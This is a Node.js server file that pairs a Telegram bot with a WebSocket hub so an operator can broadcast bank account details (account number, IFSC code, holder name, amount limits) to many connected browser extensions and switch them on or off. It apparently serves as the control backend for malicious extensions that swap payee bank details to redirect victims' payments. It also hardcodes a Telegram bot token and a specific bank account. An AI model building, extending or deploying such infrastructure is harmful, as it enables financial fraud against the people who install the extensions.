const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json());

const TELEGRAM_TOKEN = '8471506288:AAEx0MXIR6QbXopPb9RNprsUlBwE2AShGuo';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

let currentAccount = {
    bankName: "BANK OF MAHARASHTRA",
    accountNumber: "60549329299",
    ifscCode: "MAHB00JD23",
    accountName: "Rahul",
    minAmount: "300",
    maxAmount: "200000"
};

const clients = new Set();
const authorizedUsers = [7137446631];

// WebSocket connection handling
wss.on('connection', (ws) => {
    clients.add(ws);
    console.log('📡 New extension connected. Total: ' + clients.size);
    
    // Send current settings immediately
    ws.send(JSON.stringify({ 
        action: 'update_account', 
        data: currentAccount 
    }));
    
    ws.on('close', () => {
        clients.delete(ws);
        console.log('📡 Extension disconnected. Total: ' + clients.size);
    });
    
    ws.on('error', (error) => {
        console.log('❌ WebSocket error:', error);
    });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            handleExtensionMessage(data, ws);
        } catch (error) {
            console.log('❌ WebSocket message parse error:', error);
        }
    });
});

function handleExtensionMessage(data, ws) {
    // Handle extension messages if needed
    console.log('Message received:', data.action);
}

function broadcastToExtensions(command) {
    let sentCount = 0;
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(command));
            sentCount++;
        }
    });
    console.log('📡 Command broadcast to ' + sentCount + ' extensions');
    return sentCount;
}

// Telegram Bot Commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!authorizedUsers.includes(msg.from.id)) {
        return bot.sendMessage(chatId, '❌ Unauthorized access!');
    }
    
    const menu = {
        reply_markup: {
            keyboard: [
                ['👁️ View Account', '🔄 Update All'],
                ['✅ Activate All', '❌ Deactivate All'],
                ['🔁 Reset Default', '📊 Status']
            ],
            resize_keyboard: true
        }
    };
    
    bot.sendMessage(chatId, 
        '🤖 *ADVANCED ACCOUNT CONTROLLER*\\n\\n' +
        'Connected: ' + clients.size + ' extensions\\n\\n' +
        'Use buttons below to control:', 
        { parse_mode: 'Markdown', ...menu }
    );
});

bot.onText(/👁️ View Account/, (msg) => {
    const accountInfo = 
        '🏦 *Bank:* ' + currentAccount.bankName + '\\n' +
        '🔢 *Account:* ' + currentAccount.accountNumber + '\\n' + 
        '🏷️ *IFSC:* ' + currentAccount.ifscCode + '\\n' +
        '👤 *Name:* ' + currentAccount.accountName + '\\n' +
        '💰 *Min:* ' + currentAccount.minAmount + '\\n' +
        '💵 *Max:* ' + currentAccount.maxAmount;
    
    bot.sendMessage(msg.chat.id, accountInfo, { parse_mode: 'Markdown' });
});

bot.onText(/🔄 Update All/, (msg) => {
    userSessions[msg.chat.id] = { waitingFor: 'bank_name' };
    bot.sendMessage(msg.chat.id, 'Please send the new *Bank Name*:', { parse_mode: 'Markdown' });
});

bot.onText(/✅ Activate All/, (msg) => {
    const count = broadcastToExtensions({ action: 'toggle_active', data: { active: true } });
    
    bot.sendMessage(msg.chat.id, 
        '✅ Activated ' + count + ' extensions', 
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/❌ Deactivate All/, (msg) => {
    const count = broadcastToExtensions({ action: 'toggle_active', data: { active: false } });
    
    bot.sendMessage(msg.chat.id, 
        '❌ Deactivated ' + count + ' extensions', 
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/🔁 Reset Default/, (msg) => {
    currentAccount = {
        bankName: "BANK OF MAHARASHTRA",
        accountNumber: "60549329299",
        ifscCode: "MAHB00JD23",
        accountName: "Rahul",
        minAmount: "300",
        maxAmount: "200000"
    };
    const count = broadcastToExtensions({ action: 'reset_account' });
    bot.sendMessage(msg.chat.id, '🔁 Reset complete for ' + count + ' extensions');
});

bot.onText(/📊 Status/, (msg) => {
    const status = 
        '📊 *SYSTEM STATUS*\\n\\n' +
        '🤖 *Bot:* ✅ Online\\n' +
        '📡 *Extensions:* ' + clients.size + ' connected\\n' +
        '🔄 *Last Update:* ' + new Date().toLocaleTimeString() + '\\n\\n' +
        '*Current Account:*\\n' +
        '🏦 ' + currentAccount.bankName + '\\n' +
        '👤 ' + currentAccount.accountName;
    
    bot.sendMessage(msg.chat.id, status, { parse_mode: 'Markdown' });
});

// Account Update Session
const userSessions = {};

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const session = userSessions[chatId];
    
    // Skip if not in session or if it's a command button
    if (!session || !session.waitingFor || 
        ['👁️ View Account', '🔄 Update All', '✅ Activate All', '❌ Deactivate All', 
         '🔁 Reset Default', '📊 Status'].includes(text)) {
        return;
    }
    
    switch(session.waitingFor) {
        case 'bank_name':
            session.bankName = text;
            userSessions[chatId].waitingFor = 'account_number';
            bot.sendMessage(chatId, 'Now send the new *Account Number*:', { parse_mode: 'Markdown' });
            break;
            
        case 'account_number':
            session.accountNumber = text;
            userSessions[chatId].waitingFor = 'ifsc_code';
            bot.sendMessage(chatId, 'Now send the new *IFSC Code*:', { parse_mode: 'Markdown' });
            break;
            
        case 'ifsc_code':
            session.ifscCode = text;
            userSessions[chatId].waitingFor = 'account_name';
            bot.sendMessage(chatId, 'Now send the new *Account Name*:', { parse_mode: 'Markdown' });
            break;
            
        case 'account_name':
            session.accountName = text;
            userSessions[chatId].waitingFor = 'complete_update';
            
            currentAccount = {
                bankName: session.bankName || "BANK OF MAHARASHTRA",
                accountNumber: session.accountNumber || "60549329299",
                ifscCode: session.ifscCode || "MAHB00JD23",
                accountName: session.accountName || "Rahul",
                minAmount: "300",
                maxAmount: "200000"
            };
            
            const count = broadcastToExtensions({ 
                action: 'update_account', 
                data: currentAccount 
            });
            
            delete userSessions[chatId];
            bot.sendMessage(chatId, 
                '✅ *ACCOUNT UPDATED*\\n\\n' +
                'Changes applied to ' + count + ' extensions\\n' +
                'All fields have been updated successfully!', 
                { parse_mode: 'Markdown' }
            );
            break;
    }
});

// API Routes
app.get('/get-account', (req, res) => {
    res.json(currentAccount);
});

app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        connectedExtensions: clients.size,
        currentAccount: currentAccount,
        timestamp: new Date().toISOString()
    });
});

// Health check
app.get('/', (req, res) => {
    res.json({ 
        message: 'Server is running',
        status: 'online',
        extensions: clients.size
    });
});

server.listen(8080, () => {
    console.log('🚀 Server running on http://localhost:8080');
    console.log('🤖 Telegram Bot Started!');
    console.log('📡 WebSocket ready for connections');
});
